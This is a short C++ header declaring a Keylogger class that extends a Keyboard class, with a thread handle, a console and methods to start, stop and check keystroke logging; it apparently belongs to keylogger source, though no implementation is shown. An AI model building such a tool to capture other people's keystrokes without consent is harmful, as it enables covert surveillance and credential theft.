#pragma once
#include <thread>
#include <iostream>
#include <locale>
#include "keyboard.h"
#include "console.h"

class Keylogger : public Keyboard {
private:
	std::thread* keylog;
	Console console;

	void setKeysState();
	void handleOutput();
public:
	Keylogger();

	void startKeylog();
	void stopKeylog();
	bool isKeylogging();
};